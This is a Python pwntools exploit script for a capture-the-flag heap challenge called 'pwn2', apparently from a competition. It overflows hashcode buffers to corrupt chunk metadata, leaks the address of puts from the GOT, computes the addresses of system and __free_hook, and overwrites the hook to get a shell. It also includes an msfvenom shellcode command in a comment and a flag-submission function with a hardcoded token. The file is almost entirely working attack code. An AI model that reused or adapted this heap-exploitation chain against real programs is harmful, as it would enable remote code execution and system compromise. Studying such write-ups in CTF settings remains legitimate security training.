#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Date    : 2017-04-26 18:28:36
# @Author  : WinterSun (511683586@qq.com)
# @Link    : https://Winter3un.github.io/
import roputils,time
import threading
from pwn import *
context(log_level="debug")
DEBUG = 1
target = "./pwn2"
remote_ip = "172.16.5.22"
port = 5009
rop = roputils.ROP(target)
# bss = rop.section('.bss')
# rop.got('puts')
# msfvenom -p linux/x86/exec CMD=/bin/sh -f python -b '\x00\x0b\x0d\x0a'
elf = ELF("./libc.so.6")


if DEBUG:
	p = process(target)
	gdb.attach(p,"b*0x400C73\nc")
	# gdb.attach(p,"b*0x400EF4\nc")
else:
	p = remote(remote_ip,port)


def post(flag):
	import requests
	
	url  = "http://172.16.4.1/Common/submitAnswer"
	
	# head = {"Cookie":""}
	# head["X-Requested-With"]="XMLHttpRequest"
	# head["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
	# head["Referer"] = "http://rhg.ichunqiu.com/competition/index"
	# head[""] = ""


	m = {'answer': flag}
	m['token']="488073bfa6f42fb4c02304ad9b661c85"
	# m["key2"] = "upfile_"

	requests.post(url,data=m)


def sl(data):
	p.sendline(data)
def sd(data):
	p.send(data)
def ru(data):
	return p.recvuntil(data)

def exp():
	## stage 1 add hashcode 0x20 id 0

	ru("option:\n")
	sl("1")
	ru("\n")
	sl("md5")
	ru("\n")
	sl("aaa")
	ru("t hashcode\n")
	sl("a"*0x20)


	## stage 2 add hashcode 0x20 id 1

	ru("option:\n")
	sl("1")
	ru("\n")
	sl("md5")
	ru("\n")
	sl("aaa")
	ru("t hashcode\n")
	sl("a"*0x20)

	## end add hashcode 0x20 id 2

	ru("option:\n")
	sl("1")
	ru("\n")
	sl("md5")
	ru("\n")
	sl("/bin/sh\x00")
	ru("t hashcode\n")
	sl("a"*0x20)


	## stage 3 change hashcode length id 0

	ru("option:\n")
	sl("3")
	ru("\n")
	sl("0")
	ru("option:\n")
	sl("1")
	ru(" hash type\n")
	sl("sha256") #change length 0x20 to 0x40

	## stage 4 edit hashcode

	ru("option:\n")
	sl("3")
	ru("\n")
	sl("0")
	ru("option:\n")
	sl("3")
	ru("hcode\n")
	payload = "a"*0x20
	payload += p64(0)+p64(21)+p64(0x20-1)+p64(0)
	sl(payload)

	## stage 5 edit chunk id 0

	ru("option:\n")
	sl("3")
	ru("\n")
	sl("1")
	ru("option:\n")
	sl("3")
	ru("hcode\n")
	payload = p64(0)+p64(21)+p64(0x20)+p64(rop.got('puts'))[:-1]
	sl(payload)

	## stage 6 leak system addr 
	ru("option:\n")
	sl("4")
	ru("\n")
	sl("md5")
	ru("input pattern\n")
	sl("a"*0x20)
	ru("name=")

	puts_addr = u64(ru("\nhashcode")[:5].ljust(8,"\x00"))
	print "puts_addr="+hex(puts_addr)

	system_addr = puts_addr-(elf.symbols["puts"]-elf.symbols["system"])

	print "system_addr="+hex(system_addr)
	free_hook_addr = puts_addr+(0x00000035f79906e8 - elf.symbols["puts"])
	print "free_hook_addr="+hex(free_hook_addr)
	## edit atoi to system

	## stage 7 edit chunk id 0

	ru("option:\n")
	sl("3")
	ru("\n")
	sl("1")
	ru("option:\n")
	sl("3")
	ru("hcode\n")
	payload = p64(0)+p64(21)+p64(0x48-1)+p64(rop.got('puts'))[:-1]
	sl(payload)

	## stage 8 edit chunk id 1

	ru("option:\n")
	sl("3")
	ru("\n")
	sl("0")
	ru("option:\n")
	sl("3")
	ru("hcode\n")
	payload = "a"*0x20
	payload += p64(0)+p64(21)+p64(0x8-1)+p64(0)+p64(free_hook_addr)[:-1]
	sl(payload)

	## stage 9 edit free_hook to system

	ru("option:\n")
	sl("3")
	ru("\n")
	sl("1")
	ru("option:\n")
	sl("3")
	ru("hcode\n")
	sl(p64(system_addr)[:-1])

	# stage 10 system
	ru("option:\n")
	sl("2")
	ru("\n")
	sl("2")
	# sl("cat /flag")
	# flag = ru("\n")[:-1]

exp()
p.interactive()